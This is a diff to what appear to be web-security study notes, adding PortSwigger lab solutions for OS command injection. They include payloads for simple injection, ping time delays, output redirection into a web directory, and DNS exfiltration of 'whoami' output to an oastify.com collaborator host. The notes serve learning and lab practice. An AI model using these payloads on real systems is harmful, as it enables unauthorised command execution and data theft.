@@ -630,6 +630,7 @@
 - File manipulation: `> malicious_script.sh`   
 - Input redirection: `echo "data" > output.txt`   
 - Subshells: `$(echo "whoami")`
+- Error-Based: `; nonexistentcommand`
 
 **Blind based Command Injection Techniques**
 | **Technique**                   | **Payload**                                         | **Observation for Successful Exploit**                                                                 |
@@ -713,6 +714,22 @@
 - Strong input validation (permited values, number, alphanumber, no other syntax or whitespace)
 
 ### Command Injection Lab
+- OS command injection, **simple** case
+  - POST /product/stock: productId=1&storeId=1`|whoami`
+- Blind OS command injection with **time delays**
+  - POST /feedback/submit:email=`||ping -c 10 127.0.0.1||`
+- Blind OS command injection with **output redirection**
+  - POST /feedback/submit: email=`||whoami>/var/www/images/output.txt||`   
+  - https://0a09007904a751a58015128400a000b5.web-security-academy.net/image?filename=`output.txt`   
+- Blind OS command injection with **out-of-band interaction**
+  - POST /feedback/submit: email=`||nslookup+6jqvweh2htw3iugqlol0e3xquh08o7cw.oastify.com||`
+  - Burp Collaborator > Poll now 
+- Blind OS command injection with **out-of-band data exfiltration**
+  - POST /feedback/submit: email=`||nslookup `whoami`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com||`
+  - ||nslookup `$(whoami)`.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com# (URL encode key chr)
+  - replace by Burp Collaborator > Poll now
+  - Backticks (`) are used to execute commands and substitute their output into another command or context
+  - whoami (the current user's username) appended to .mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com. For e.g **root**.mpfb2unin92joam6r4rgkj360x6ouoid.oastify.com
 
 ## Information Disclosure
 Content for Information Disclosure...
